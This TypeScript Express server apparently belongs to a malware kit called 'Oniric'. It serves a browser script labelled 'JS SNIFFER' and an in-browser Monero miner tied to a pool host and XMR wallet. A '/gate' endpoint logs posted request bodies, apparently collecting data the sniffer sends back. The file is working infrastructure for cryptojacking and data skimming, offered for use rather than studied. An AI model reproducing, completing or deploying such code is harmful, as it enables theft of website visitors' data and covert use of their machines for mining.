import {RealtimeServer} from "./libs/poolws";
const http = require("http");
const fs = require("fs");
const express = require("express");
const app = express();
const cors = require("cors");
const bodyParser = require('body-parser');
export const conf = JSON.parse(fs.readFileSync(__dirname + "/config.json", "utf8"));
export class App {
    constructor() {
        app.options('*', cors());
        app.use(bodyParser.urlencoded({
            extended: false
        }));
        app.use(bodyParser.json());
        app.use(express.static(__dirname+'/web'));
        this.start();
    }
    private start(): void{
        app.get('/gate',(req,res)=>{
            console.log(req.body);
            res.status(200);
            res.end();
        });
        const web = http.createServer(app);
        RealtimeServer(web);
        web.listen(conf.port,conf.domain , () => {
            console.log('[!] Oniric Server Loaded');
            console.log('[!] Realtime on: ws://' + conf.domain + ':' + conf.port);
            console.log('[!] Rest-Api on: http://'+ conf.domain + ':' + conf.port);
            console.log('[!] Pool Host: '+conf.pool);
            console.log('[!] XMR Wallet: ' + conf.addr);
            console.log(`[!] Daemon start. PID: ${process.pid}`);
            console.log('[!] JS SNIFFER on: '+ conf.domain + ':' + conf.port + "/Sniffer.js");
            console.log('[!] Miner on: '+ conf.domain + ':' + conf.port + "/Oniric.js");
        });
    }
}
export default new App();